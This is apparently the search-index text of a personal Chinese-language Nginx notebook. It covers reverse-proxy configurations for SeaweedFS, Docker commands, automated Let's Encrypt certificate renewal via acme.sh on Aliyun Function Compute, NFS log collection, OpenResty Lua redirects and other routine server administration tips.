\u8fd9\u79cdrewrite\u662f\u4e0d\u4f1a\u4fee\u6539POST\u7684url\u7684\u3002\u3002\u3002\u5c31\u5f88\u8ff7\uff0c\u53e6\u5916\u5141\u8bb8\u7528\u6237POST\u4e0a\u4f20\u4e5f\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u7981\u6b62\u4e86\u975eGET\u65b9\u6cd5 \u4fee\u6539\u540e\u7aef\u7279\u5b9aheader \u00b6 \u8fd9\u91cc\u7528\u7684\u662f\u5148\u5220\u9664 proxy_hide_header \u518d\u6dfb\u52a0 add_header \u6211\u8fd8\u662f\u60f3\u8ba9nginx\u4e5f\u80fd\u652f\u6301\u7ed9seaweedfs\u4e0a\u4f20\u6587\u4ef6 \u00b6 \u4e0d\u8981\u6b7b\u78d5\u4e00\u4e2alocation\u561b\uff0c\u518d\u914d\u7f6e\u4e2a\u5457\uff1a location / upload_images / { rewrite ^/ upload_images ( /.* ) $ $ 1 break ; resolver 127.0 . 0.11 valid = 10 s ; proxy_pass http : // weedfs : 8888 / my_images $ 1 ; allow 127.0 . 0.0 / 8 ; deny all ; } \u8fd9\u6837\u914d\u7f6e\u7684\u6548\u679c\u662fPOST /upload_images/ \u76f8\u5f53\u4e8e\u5728POST http://weedfs:8888/my_images/ \u4e0e\u524d\u8ff0\u7684GET\u914d\u7f6e\u662f\u76f8\u540c\u7684\u540e\u7aef\u8def\u5f84\uff0c\u4e0a\u4f20\u7684\u6587\u4ef6\uff08\u5982 /123.jpg \uff09\u5c31\u4f20\u5230\u4e86weedfs\u7684 http://weedfs:8888/my_images/123.jpg \u80fd\u901a\u8fc7 /images/123.jpg \u8bbf\u95ee\u5230 \u914d\u7f6eproxy_pass\u4f7f\u7528\u7684DNS\u670d\u52a1\u5668 \u00b6 \u7531\u4e8e\u8fd9\u4e2anginx\u662f\u5728Docker\u5bb9\u5668\u91cc\u9762\u7684\uff0cweedfs\u662f\u53e6\u4e00\u4e2a\u5bb9\u5668\u52a0\u5165\u7f51\u7edc\u7684\u65f6\u5019\u6307\u5b9a\u7684\u522b\u540d\uff0c\u6240\u4ee5\u6ce8\u610f\u4e0a\u9762\u7684resolver\u8bbe\u7f6e\u4e3a\u4e0e\u5bb9\u5668/etc/resolv.conf\u4e00\u81f4\u7684 127.0.0.11 \u7ecf\u8fc7\u6211\u6d4b\u8bd5\uff0c\u8fd9\u4e2a\u914d\u7f6e\u5fc5\u987b\u5728location\u4e2d\u624d\u6709\u6548\uff0c\u653e\u5230http\u91cc\u9762\u6ca1\u7528 Docker \u6211\u4f7f\u7528\u7684seaweedfs\u542f\u52a8\u547d\u4ee4 \u00b6 \u7f16\u8bd1\u955c\u50cf \u907f\u514d\u4e22\u5931filer\u6570\u636e \u00b6 \u9996\u5148\u9700\u8981\u81ea\u5df1\u7f16\u8bd1\u4e00\u4e2aDocker\u955c\u50cf\uff0c\u9ed8\u8ba4\u7684\u955c\u50cf\u4f1a\u628afiler\u7684leveldb\u6570\u636e\u5b58\u50a8\u5728\u6839\u76ee\u5f55\uff0c\u5220\u9664\u5bb9\u5668\u5c31\u4f1a\u4e22\u5931\u8fd9\u90e8\u5206\u6570\u636e \u53c2\u89c1\uff1ahttps://github.com/chrislusf/seaweedfs/blob/master/docker/ filer.toml : [leveldb] enabled = true dir = \"/data/filer/\" Dockerfile : FROM chrislusf/seaweedfs COPY filer.toml /etc/seaweedfs/filer.toml \u542f\u52a8\u547d\u4ee4 \u00b6 docker run - dit --name weedfs --restart=always --user nobody -v /data/weedfs:/data myweed -log_dir=/data/logs/ server -dir /data -filer=true -filer.disableDirListing -volume.publicUrl=weedfs.py3.io docker network connect useweed weedfs --alias weedfs \u5efa\u8bae\u5728\u6d4b\u8bd5\u7684\u65f6\u5019\u4e0d\u8981\u7528 -filer.disableDirListing \u9009\u9879\uff0c\u53ef\u4ee5\u5217\u76ee\u5f55\u6765\u770b\u770b\u5230\u5e95\u4e0a\u4f20\u5230\u54ea\u4e86\uff1a curl -H \"Accept: application/json\" \"http://weedfs:8888/my_images/?pretty=y\" \u53e6\u5916\u6ce8\u610f\u542f\u52a8\u524d\u521b\u5efa\u6587\u4ef6\u5939\u548c\u914d\u7f6e\u6743\u9650\uff1a\uff08\u4e0d\u8981\u4ee5\u4e3a\u4eba\u5bb6\u4f1a\u7ed9\u4f60\u521b\u5efa\u76ee\u5f55\uff09 mkdir -p /data/weedfs/logs/ mkdir -p /data/weedfs/filer/ sudo chown -R nobody /data/weedfs B\u670d\u52a1\u5668\u7684\u5b9e\u73b0 \u00b6 TARGET_SERVER = \"http://images.example.com/\" WEEDFS_FILER_ENDPOINT = \"http://nginx/upload_images/\" from flask import Flask , Response import requests import io sess = requests . session () app = Flask ( __name__ ) @app.route ( \"/my_images/<name>\" ) def handler ( name ): x = sess . get ( TARGET_SERVER + name ) sess . post ( WEEDFS_FILER_ENDPOINT , files = [( 'filename' , ( name , io . BytesIO ( x . content )))]) return Response ( x . content , mimetype = \"image/jpeg\" ) \u987a\u4fbf\u9644\u4e0aPython\u5e93pyseaweed\u7684\u4f7f\u7528 \u00b6 pip install pyseaweed \u5982\u679c\u670d\u52a1\u5668\u542f\u52a8\u7684\u65f6\u5019\u914d\u7f6e\u7684 publicUrl \u4ee5 https:// \u5f00\u5934\uff0c\u8fd9\u4e2a pyseaweed \u5e93\u662f\u6709\u95ee\u9898\u7684\uff0c\u9700\u8981\u624b\u52a8\u4fee\u51e0\u5904url\u6784\u9020\u7684\u5730\u65b9 publicurl = \"http://localhost:8080/\" from pyseaweed import WeedFS w = WeedFS ( \"localhost\" , 9333 , use_session = True ) # \u4e0a\u4f20 \u4e5f\u652f\u6301\u4f20\u5165\u6d41 fid = w . upload_file ( filename ) # \u4e0b\u8f7d \u5f97\u5230\u5bf9\u8c61\u5b57\u8282 data = w . conn . _conn . get ( publicurl + fid ) . content proxy_pass \u52a8\u6001\u4ee3\u7406 \u00b6 \u6548\u679c\uff1a\u8bbf\u95ee /www.example.com/ \u53cd\u5411\u4ee3\u7406\u5230 http://www.example.com \uff0c\u5e76\u652f\u6301\u4e00\u6b21\u8df3\u8f6c location ~ ^/ (. * ) $ { proxy_pass http : // $ 1 ; proxy_intercept_errors on ; error_page 301 302 307 = @handle_redirect ; } location @handle_redirect { set $ saved_redirect_location '$upstream_http_location' ; proxy_pass $ saved_redirect_location ; } Nginx\u9690\u85cfServer\u5934 \u7b80\u5355\u65b9\u5f0f \u00b6 \u53c2\u8003\uff1a https://serverfault.com/questions/214242/can-i-hide-all-server-os-info apt install -y nginx-extras \u914d\u7f6e\u4e2d\u6dfb\u52a0\uff1a header_filter_by_lua 'ngx.header[\"server\"] = nil'; \u4f7f\u7528\u963f\u91cc\u4e91\u51fd\u6570\u8ba1\u7b97\u5b9a\u65f6\u66f4\u65b0https\u8bc1\u4e66 \u00b6 \u4e3a\u4e86\u51cf\u5c11\u5bf9vps\u7684\u4f9d\u8d56\uff0c\u9010\u6b65\u5c06\u4e00\u4e9b\u5728\u670d\u52a1\u5668\u4e0a\u8dd1\u7684\u4efb\u52a1\u8fc1\u79fb\u5230\u66f4\u52a0\u53ef\u9760\u7684\u51fd\u6570\u8ba1\u7b97 \u8fd9\u4e0d\u662f\u4e00\u4e2a\u8be6\u7ec6\u7684\u6559\u7a0b\uff0c\u4f60\u8fd8\u9700\u8981\u81ea\u884c\u63a2\u7d22\u7814\u7a76 \u5165\u53e3 \u00b6 https://fc.console.aliyun.com \u5173\u952e\u8bcd\uff1a \u6559\u7a0b \u5b9a\u4ef7 128MB\u662f\u514d\u8d39\u7684 \u5b9a\u65f6\u89e6\u53d1\u5668 \u65e5\u5fd7\u670d\u52a1 \u4ee3\u7801\u6846\u67b6 \u00b6 Python3 \u5148\u672c\u5730 git clone --depth 1 https://github.com/Neilpang/acme.sh \uff0c\u518d\u521b\u5efa\u4e2aindex.py \u628a\u4ee3\u7801\u6587\u4ef6\u5939\u4e0a\u4f20\u4e0a\u53bb \u7f51\u9875\u4e0a\u5728\u7ebf\u7f16\u8f91index.py\u4e0d\u4f1a\u4e22\u5931acme.sh\u6587\u4ef6\u5939\uff08\u53ea\u4f1a\u6539\u52a8index.py\uff09\uff0c\u4ee3\u7801\u6539\u52a8\u540e\u5c31\u80fd\u76f4\u63a5\u8fd0\u884c\u770b\u5230\u7ed3\u679c\uff08\u5b9e\u65f6\u8f93\u51fa\u9700\u8981\u53bb\u65e5\u5fd7\u670d\u52a1\u641c\u7d22\uff09\uff0c\u8fd8\u662f\u633a\u597d\u7528\u7684 \u4f7f\u7528\u8fd9\u4e2a\u4ee3\u7801\u9700\u8981\u5148\u521b\u5efa\u4e00\u4e2a\u53ef\u4ee5\u8bbf\u95eeOSS\u7684AccessKey\uff0c\u586b\u5165 oss2.Auth \u90e8\u5206\u2014\u2014\u5c06\u751f\u6210\u7684https\u8bc1\u4e66\u548c\u79c1\u94a5\u5b58\u50a8\u5230OSS\uff0c\u5c06Key\u786c\u7f16\u7801\u5230\u4ee3\u7801\u4e2d\u4e0d\u662f\u4e00\u4e2a\u597d\u4e60\u60ef\uff0c\u8fd9\u91cc\u5c31\u7b80\u5355\u7c97\u66b4\u5b9e\u73b0\u4e86 \u57df\u540d\u9a8c\u8bc1\u65b9\u5f0f\u7528\u7684\u662fchallenge-alias\u7684dns\u9a8c\u8bc1\uff0c\u9700\u8981\u5c06 _acme-challenge.py3.io \u8bbe\u7f6eCNAME\u5230 _acme-challenge.chenyuan.me \u3002 \u5982\u679c\u4f60\u8fd8\u9700\u8981\u66f4\u591a\u7684\u5b50\u57df\u540d\u5982 *.subdomain.py3.io \uff0c\u90a3\u4e5f\u8981\u628a _acme-challenge.subdomain.py3.io \u8bbe\u7f6eCNAME\u5230 _acme-challenge.chenyuan.me \u7528\u7684\u662fcloudflare\u7684API\uff0c\u9700\u8981\u63d0\u4f9b CF_Key \u548c CF_Email \uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 \u66f4\u591a\u7684API \u5b9a\u65f6\u5668\u8bbe\u7f6e\u5341\u4e94\u5929\u6267\u884c\u4e00\u6b21\uff0ccron\u8868\u8fbe\u5f0f\u4e3a\uff1a 0 0 0 1,15 * * \u4f60\u9700\u8981\u66ff\u6362\u4e0b\u9762\u4ee3\u7801\u7684REGION OSS\u5730\u57df, AK, SK \u53ef\u4ee5\u8bbf\u95eeOSS\u7684\u5bc6\u94a5, OSSNAME \u4f7f\u7528\u7684OSS\u540d\u79f0, CF_Key cloudflare\u7684API Key, CF_Email cloudflare\u7684\u7528\u6237\u540d\u90ae\u7bb1, chenyuan.me \u5728cloudflare\u4e0a\u6258\u7ba1\u7684\u57df\u540d, py3io_ATxx \u7533\u8bf7\u5f97\u5230\u7684\u8bc1\u4e66\u7684\u540d\u79f0 \u52a0\u5165\u968f\u673a\u5b57\u7b26\u4e32\u907f\u514d\u88ab\u731c\u5230, [\"py3.io\", \"*.py3.io\"] \u7533\u8bf7\u7684\u57df\u540d\u5217\u8868 # -*- coding: utf-8 -*- import os import logging import random import os import oss2 import io import time import string import json logger = logging . getLogger () endpoint = 'http://oss-cn-REGION-internal.aliyuncs.com' auth = oss2 . Auth ( 'AK' , 'SK' ) bucket = oss2 . Bucket ( auth , endpoint , 'OSSNAME' ) def getcert ( name , domains ): global logger try : try : lasttime = bucket . get_object_meta ( name + \".crt\" ) . last_modified if time . time () - lasttime <= 86400 * 60 : # do not recreate cert for 60 days logger . info ( 'Skip cert for ' + name ) return except : pass logger . info ( 'Getting cert for ' + name ) domain_text = \"-d '\" + \"' -d '\" . join ( domains ) + \"'\" cmd = \"CF_Key=xxx CF_Email=xxx@yyy.com ./acme.sh/acme.sh --issue --dns dns_cf \" + domain_text + \" --dnssleep 5 --fullchain-file /tmp/\" + name + \".crt --key-file /tmp/\" + name + \".key -f \" if name != \"chenyuan.me\" : cmd += \"--challenge-alias chenyuan.me\" print ( \"acme.sh --issue\" + cmd . split ( \"--issue\" )[ 1 ]) assert os . system ( cmd ) == 0 , \"get cert failed\" bucket . put_object_from_file ( name + \".crt\" , \"/tmp/\" + name + \".crt\" ) bucket . put_object_from_file ( name + \".key\" , \"/tmp/\" + name + \".key\" ) logger . info ( 'Done for ' + name ) except Exception as e : logger . exception ( \"exception happend: \" + name ) def handler ( event , context ): getcert ( \"py3io_ATxx\" , [ \"py3.io\" , \"*.py3.io\" ]) return 'ok' \u66f4\u591a\u8bf4\u660e \u00b6 \u53d6\u5f97\u4e00\u4e2a\u57df\u540d\u7684\u8bc1\u4e66\u5927\u7ea6\u9700\u89811~2\u5206\u949f\uff0c\u7531\u4e8e\u51fd\u6570\u8ba1\u7b97\u5141\u8bb8\u7684\u6700\u957f\u8d85\u65f6\u662f600\u79d2\uff0c\u8fd8\u6709\u8003\u8651\u7f51\u7edc\u56e0\u7d20\uff08\u6bd5\u7adfcloudflare\u548clet\u2019s encrypt\u90fd\u5728\u56fd\u5916\uff09\uff0c \u662f\u6709\u53ef\u80fd\u5931\u8d25\u7684 \u6211\u91c7\u53d6\u7684\u7b56\u7565\u5c31\u5f88\u7b80\u5355\u7c97\u66b4 \u6bcf15\u5929\u6267\u884c\u4e00\u904d\uff0c\u4e00\u4e2a\u57df\u540d\u5931\u8d25\u4e86\u4e0d\u5f71\u54cd\u5176\u4ed6\u57df\u540d\u7684\u5c1d\u8bd5\uff0c60\u5929\u5185\u6210\u529f\u4e86\u7684\u57df\u540d\u4e0d\u4f1a\u53cd\u590d\u7533\u8bf7\uff0c\u603b\u4f1a\u6210\u529f\u7684 \u5b89\u5168\u6027\uff1a\u4e3a\u4e86\u4fbf\u4e8e\u5c06\u8bc1\u4e66\u90e8\u7f72\u5230web\u670d\u52a1\u5668\uff0cOSS\u4ed3\u5e93\u662f\u8bbe\u7f6e\u6210\u516c\u5f00\u8bfb\u7684\uff0c\u8fd9\u6837\u5c31\u53ef\u80fd\u6cc4\u9732\u79c1\u94a5\u6587\u4ef6\uff08\u653b\u51fb\u8005\u77e5\u9053OSS\u540d\u79f0\uff0c\u731c\u5230\u6587\u4ef6\u540d\u79f0\uff09\uff0c\u4f60\u53ef\u4ee5\u7528Referer\u9650\u5236\u6765\u589e\u52a0\u4e00\u70b9\u5b89\u5168\u6027 web\u670d\u52a1\u5668\u4e0a\u7684\u90e8\u7f72 \u00b6 \u4e5f\u662f\u5199\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\u54af 0 0 0 3,17 * * \uff0c\u6bcf\u4e2a\u67083\u53f7\u548c17\u53f7\u7528curl\u83b7\u53d6\u4e00\u4e0b\u6700\u65b0\u7684\u8bc1\u4e66 \u5982\u679cnginx\u7684\u914d\u7f6e\u539f\u5148\u5c31\u662f\u9519\u7684\uff0c\u4e0d\u4f1a\u5c1d\u8bd5\u66f4\u65b0\u8bc1\u4e66 \u5982\u679c\u66f4\u65b0\u8bc1\u4e66\u540enginx\u65e0\u6cd5\u542f\u52a8\uff08\u6bd4\u5982\u65e0\u6cd5\u8fde\u4e0a\u963f\u91cc\u4e91\u4e0b\u8f7d\u7684\u6587\u4ef6\u4e3a\u7a7a\u6216404\uff09\uff0c\u4f1a\u56de\u6eda\u8fd9\u4e2a\u6539\u52a8\uff0c\u4fdd\u8bc1nginx\u4ecd\u7136\u53ef\u4ee5\u542f\u52a8 \u4f60\u9700\u8981\u66ff\u6362\u4e0b\u9762\u4ee3\u7801\u7684NAME, OSSNAME, REGION \u540c\u4e0a, Referer_STRING \u5728OSS\u8bbe\u7f6e\u7684\u53ea\u5141\u8bb8\u8fd9\u4e2aReferer_STRING\u8bbf\u95ee \u4e0d\u5141\u8bb8Referer\u4e3a\u7a7a \u589e\u52a0\u5b89\u5168\u6027 1 2 3 4 5 6 7 8 9 10 11 12 13 #!/bin/bash set -ex export PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin cd /var/www NAME = \"py3io_ATxx\" curl -o ${ NAME } .crt.new https://OSSNAME.oss-cn-REGION.aliyuncs.com/ ${ NAME } .crt -H \"Referer: Referer_STRING\" curl -o ${ NAME } .key.new https://OSSNAME.oss-cn-REGION.aliyuncs.com/ ${ NAME } .key -H \"Referer: Referer_STRING\" nginx -s reload mv ${ NAME } .crt ${ NAME } .crt.old mv ${ NAME } .key ${ NAME } .key.old mv ${ NAME } .crt.new ${ NAME } .crt mv ${ NAME } .key.new ${ NAME } .key nginx -s reload || ( mv ${ NAME } .crt.old ${ NAME } .crt ; mv ${ NAME } .key.old ${ NAME } .key ) \u4f7f\u7528nfs\u5b58\u50a8Nginx\u65e5\u5fd7 \u00b6 \u8003\u8651\u4e00\u4e2a\u4e0d\u7a33\u5b9a\u7684\u5b58\u50a8\u4ecb\u8d28 \u5982\u6811\u8393\u6d3e\uff0c\u60f3\u7b80\u5355\u5730\u628a\u65e5\u5fd7\u5b58\u50a8\u5230\u5176\u4ed6\u670d\u52a1\u5668\u4e0a \u7531\u4e8enfs\u53ef\u80fd\u7531\u4e8e\u7f51\u7edchang\uff0c\u800cNginx\u5728\u65e0\u6cd5\u5199\u65e5\u5fd7\u7684\u65f6\u5019\u4e5f\u65e0\u6cd5\u63d0\u4f9bweb\u8bbf\u95ee\uff0c \u6240\u4ee5\u6211\u7684\u505a\u6cd5\u662f\u5148\u5199\u5230\u672c\u5730\uff0c\u6bcf\u4e2a\u5c0f\u65f6\u5c06\u65b0\u7684log\u8ffd\u52a0\u5230nfs\u540c\u540d .1 \u6587\u4ef6\u91cc \u7528\u5230\u7684\uff1anfs\uff0cNginx SIGUSR1\u4fe1\u53f7\uff0c\u5b9a\u65f6\u4efb\u52a1 \u670d\u52a1\u7aef\u7684nfs\u955c\u50cf\uff1a https://hub.docker.com/r/itsthenetwork/nfs-server-alpine/ docker run --restart=always -d --name nfs -v /data:/nfsshare --privileged --net=host -e SHARED_DIRECTORY=/nfsshare itsthenetwork/nfs-server-alpine \u5ba2\u6237\u7aef\uff08web\u670d\u52a1\u5668\uff09\uff1a mkdir /nfs mount SERVER_IP:/ /nfs collectlog.sh\u5199\u5230/nfs\u91cc\uff0c\u5982\u679cnfs\u53d1\u751f\u4e86hang\uff0c\u811a\u672c\u4e5f\u4e0d\u4f1a\u6267\u884c 1 2 3 4 5 6 7 8 9 10 11 #!/bin/bash export PATH = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin cd /var/log/nginx for i in *.log ; do mv $i ${ i } .1 ; done kill -USR1 ` cat /var/run/nginx.pid ` sleep 1 for i in *.log.1 ; do cat $i >> /nfs/ $i done cron\u52a0\u5165\uff1a\u6bcf\u5c0f\u65f6\u5199\u5165\u4e00\u6b21 0 * * * * /nfs/collectlog.sh \u4f7f\u7528openresty Lua\u7f16\u7a0b\u5b9e\u73b0hook\u8df3\u8f6c \u00b6 \u9700\u6c42\uff1a\u6709\u591a\u4e2a\u7f51\u7ad9\u7528\u6237\u8bbf\u95ee\u4e4b\u524d\u9700\u8981\u5e26\u4e0aauthtoken\uff0c\u6ca1\u6709\u8fd9\u4e2aCookie\u5219\u5148\u8df3\u8f6c\u5230\u767b\u5f55\u754c\u9762 \u4f7f\u7528openresty\u6765\u65b9\u4fbf\u5730\u5199Lua\uff1a \u5b89\u88c5\u53c2\u8003 https://openresty.org/cn/linux-packages.html sudo apt-get -y install --no-install-recommends wget gnupg ca-certificates wget -O - https://openresty.org/package/pubkey.gpg | sudo apt-key add - echo \"deb http://openresty.org/package/ubuntu $(lsb_release -sc) main\" \\ | sudo tee /etc/apt/sources.list.d/openresty.list sudo apt-get update sudo apt-get -y install openresty \u53ef\u80fd\u4f60\u4f1a\u559c\u6b22\u539f\u6765\u7684nginx\u7684\u76ee\u5f55\u8bbe\u7f6e\uff0c\u505a\u4e2a\u8f6f\u94fe\u63a5\u5457\uff1a ln - s / usr / local / openresty / nginx / logs / var / log / nginx alias nginx = openresty \u5feb\u901f\u5165\u95e8\uff1a https://openresty.org/cn/getting-started.html \u5c31\u662fcontent_by_lua_block\u91cc\u9762\u76f4\u63a5\u5199lua\u4ee3\u7801\u5373\u53ef http { server { listen 8080; location / { default_type text/html; content_by_lua_block { ngx.say(\" <p> hello, world </p> \") } } } } \u60f3\u77e5\u9053ngx\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u770b\u8fd9\u4e2a\u6587\u6863\uff1a https://github.com/openresty/lua-nginx-module#ngxarg \u4f8b\u5982\u83b7\u53d6http GET\u7684a\u53c2\u6570\uff1a ngx.var.arg_a , \u8bf7\u6c42\u7684Host\u53c2\u6570\uff1a ngx.var.http_host \u83b7\u53d6Cookie: \u4f7f\u7528https://github.com/cloudflare/lua-resty-cookie \u5148\u6267\u884c\uff1a wget -O /etc/openresty/cookie.lua https://github.com/cloudflare/lua-resty-cookie/raw/master/lib/resty/cookie.lua \u5728http\u4e2d\u52a0\u5165: lua_package_path \"/etc/openresty/?.lua;;\"; local ck = require \"cookie\" local cookie, err = ck:new() if not cookie then ngx.log(ngx.ERR, err) return end #\u7136\u540e\u5373\u53ef\u4f7f\u7528cookie:get(\"authtoken\") \u60f3\u4f7f\u7528rewrite_by_lua_file\u5219\u9700\u8981\u628a\u6587\u4ef6\u653e\u5728/usr/local/openresty/nginx \u7ed3\u675f\u5f53\u524d\u811a\u672c\u7ee7\u7eed\u540e\u7eed\u8bf7\u6c42\u5904\u7406 \u7528 ngx.exit(0) \u7ed3\u675f\u6574\u4e2a\u8bf7\u6c42 \u7528 ngx.exit(200) \u8df3\u8f6c\u7528 ngx.redirect(\"https://py3.io\") Lua\u7684\u4e09\u76ee\u8fd0\u7b97\uff1a a and b or c \u4e0d\u540c\u5b50\u57df\u540d\u53cd\u4ee3\u5230\u4e0d\u540c\u7aef\u53e3 \u00b6 \u4f60\u53ef\u4ee5\u590d\u5236\u7c98\u8d34\u591a\u4e2aserver\u5757\uff0c\u4f46\u4f7f\u7528map\u662f\u4e00\u4e2a\u66f4\u4f18\u96c5\u7684\u65b9\u6848 http { map $subdomain $subdomain_port { subdomain1 12345; subdomain2 54321; default 1; } server { listen 80; server_name ~^(?P<subdomain>.+?)\\.2020\\.actf\\.lol$; location / { proxy_pass http://127.0.0.1:$subdomain_port; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; } } } Nginx\u914d\u7f6e\u6587\u4ef6\u683c\u5f0f\u5316 \u00b6 \u76f4\u63a5\u7528vi\u6539\u4e86\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u5f88\u5bb9\u6613\u4e0d\u6ce8\u610f\u7f29\u8fdb\uff0c\u6709\u6ca1\u6709\u4e00\u4e2a\u81ea\u52a8prettify\u7684\u5de5\u5177\u5462 \u8fd8\u771f\u6709\uff1a https://github.com/1connect/nginx-config-formatter wget https://raw.githubusercontent.com/1connect/nginx-config-formatter/master/nginxfmt.py python3 nginxfmt.py /etc/nginx/nginx.conf","title":"Nginx"},{"location":"Nginx/#nginx","text":"\u8bb0\u5f55\u7528\u5230\u7684\u914d\u7f6e\uff0c\u8bf4\u4e0d\u5b9a\u4f60\u4e5f\u80fd\u9047\u5230\u8fd9\u4e9b\u7279\u6b8a\u9700\u6c42\u5462~","title":"Nginx"},{"location":"Nginx/#nginx_1","text":"\u8bf7\u4ee5\u6279\u5224\u7684\u773c\u5149\u9605\u8bfb\u4ee5\u4e0b\u94fe\u63a5\u6216\u8005\u81ea\u884cgoogle\uff0c\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898\uff1a http://www.nginx.cn/591.html nginx.conf\u5728\u4f60Linux\u7684\u4ec0\u4e48\u76ee\u5f55\u4e0b\uff1f\u7528\u4ec0\u4e48\u547d\u4ee4\u77e5\u9053\u7684\uff1f\u4fee\u6539\u914d\u7f6e\u540e\u901a\u8fc7\u4ec0\u4e48\u547d\u4ee4\u91cd\u65b0\u8f7d\u5165\u914d\u7f6e\uff1f nginx.conf\u5206\u4e3a\u51e0\u4e2a\u90e8\u5206\uff1f\u6211\u4eec\u9700\u8981\u5173\u6ce8\u7684\u662f\u54ea\u4e2a\uff1f nginx.conf\u4e2d\u600e\u4e48\u8868\u793a\u6ce8\u91ca\u884c\uff1f\u662f\u5426\u7559\u610f\u5230include\u7684\u884c\u8f7d\u5165\u4e86\u989d\u5916\u7684\u914d\u7f6e\u6587\u4ef6\uff1f \u5982\u4f55\u589e\u52a0\u4e00\u4e2a\u865a\u62df\u4e3b\u673a\uff0c\u6839\u636e\u57df\u540d\u6765\u533a\u5206\u8bbf\u95ee\u4e0d\u540c\u7684\u7f51\u7ad9\uff1f\u8bbf\u95ee\u8005\u76f4\u63a5\u8bbf\u95eeIP\u6216\u8005\u9519\u8bef\u7684\u57df\u540d\u4f1a\u5339\u914d\u5230\u9ed8\u8ba4\u7f51\u7ad9\uff0c\u600e\u4e48\u914d\u7f6e\u9ed8\u8ba4\u7f51\u7ad9\uff1f \u8fd9\u4e9b\u662f\u66f4\u4e3a\u8fdb\u9636/\u53d1\u6563\u7684\u95ee\u9898\uff1a \u9759\u6001\u5185\u5bb9\uff1aroot\u4e0ealias\u6709\u4f55\u533a\u522b\uff1f\u8bbf\u95ee403\u4e86\u600e\u4e48\u529e\uff1f \u52a8\u6001\u5185\u5bb9/\u53cd\u5411\u4ee3\u7406\uff1a\u5982\u4f55\u505a\u8d1f\u8f7d\u5747\u8861\u3001\u6587\u672c\u66ff\u6362\uff1f \u5168\u7ad9https\u548cHTTP/2.0\u600e\u4e48\u914d\u7f6e\uff1f Nginx\u662f\u5426\u6709\u5fc5\u8981\u4f5c\u4e3a\u4e00\u4e2aDocker\u5bb9\u5668\u8fd0\u884c\uff1fCentOS\u4e0bNginx\u955c\u50cf\u5f88\u5927\uff0c\u600e\u4e48 \u51cf\u5c0f\u955c\u50cf\u5927\u5c0f \uff1f Nginx\u7684worker\u8fdb\u7a0b\u4e00\u822c\u4e0d\u662froot\u6743\u9650\u7684\uff0c\u90a3\u662f\u600e\u4e48\u76d1\u542c\u523080\u7aef\u53e3\u7684\uff1f Nginx\u5728\u5904\u7406\u9ad8\u5e76\u53d1\u7684\u65f6\u5019\u53c2\u6570\u5982\u4f55\u8c03\u4f18\uff1f \u5982\u4f55\u5728Nginx\u5c42\u9762\u62e6\u622asql\u6ce8\u5165\u3001\u5bc6\u7801\u7206\u7834\u7b49\u5b89\u5168\u98ce\u9669\uff1f VeryNginx","title":"Nginx\u601d\u8003\u9898"},{"location":"Nginx/#post","text":"error_page 405 = 200 @405 ;","title":"\u666e\u901a\u8d44\u6e90\u5141\u8bb8POST"},{"location":"Nginx/#php","text":"\u8fd9\u91cc\u7684\u601d\u8def\u662f\u7528\u53cd\u5411\u4ee3\u7406\u7684\u65b9\u5f0f\u7b80\u5355\u5b9e\u73b0 location /path/something { proxy_pass http://yourdomain/path/something.php; proxy_method GET; } \u987a\u5e26\u62d2\u7edd\u6389\u5bf9php\u540e\u7f00\u7684\u731c\u6d4b\uff1a location = /path/something.php { if ($remote_addr != '\u670d\u52a1\u5668\u81ea\u8eabIP') { return 404; } include fastcgi.conf; }","title":"\u4e0d\u5e26\u540e\u7f00\u7684\u6587\u4ef6\u5f53\u6210php\u6267\u884c"},{"location":"Nginx/#httphttps","text":"location /{ rewrite ^ https://$host$request_uri? permanent; }","title":"http\u8df3\u8f6c\u5230https"},{"location":"Nginx/#lets-encrypthttps","text":"\u4e3a\u7b80\u5316\u64cd\u4f5c\uff0c\u6211\u5199\u4e86\u4e00\u4e2a\u66f4\u52a0\u65b9\u4fbf\u7684 getcert.py","title":"\u83b7\u5f97Let's encrypt\u514d\u8d39https\u8bc1\u4e66"},{"location":"Nginx/#_1","text":"","title":"\u4f7f\u7528\u65b9\u6cd5\uff1a"},{"location":"Nginx/#_2","text":"\u914d\u7f6e\u76f8\u5e94\u7f51\u7ad9\u7684nginx conf\u4e2d\u7684server\u91cc\u9762\uff0c\u52a0\u5165\u8fd9\u4e2a\uff1a location /.well-known/acme-challenge { alias \u4fdd\u5b58\u5bc6\u94a5\u7684\u76ee\u5f55; try_files $uri =404; } \u8bb0\u5f97\u8fd0\u884c\u540e nginx -s reload","title":"\u7b2c\u4e00\u6b65\uff1a"},{"location":"Nginx/#getcertpy","text":"pushd \u4e0a\u8ff0\u4fdd\u5b58\u5bc6\u94a5\u7684\u76ee\u5f55 wget https://raw.githubusercontent.com/zjuchenyuan/notebook/master/code/getcert.py ./getcert.py \u6587\u4ef6\u540d\u79f0 \u8be5\u8bc1\u4e66\u5305\u542b\u7684\u57df\u540d\u5217\u8868 \u4f8b\u5982\u8fd9\u6837\u5c31\u80fd\u83b7\u5f97\u4e00\u5f20\u6db5\u76d6zjusec.com\u4e09\u4e2a\u5b50\u57df\u540d\u7684\u8bc1\u4e66\uff1a ./getcert.py zjusec zjusec.com,www.zjusec.com,web.zjusec.com \u5177\u4f53\u6765\u8bf4\uff0c\u8fd9\u4e2a\u811a\u672c\u4f1a\u81ea\u52a8\u4e0b\u8f7d\u9700\u8981\u7684acme_tiny.py\u548cLet\u2019s Encrypt\u7684\u4e2d\u95f4\u8bc1\u4e66\uff0c\u8c03\u7528openssl\u521b\u5efa\u8d26\u53f7\u79c1\u94a5\u548c\u7ad9\u70b9\u79c1\u94a5\uff0c\u6700\u7ec8\u4ea7\u751f \u540d\u79f0.crt \u540d\u79f0.key 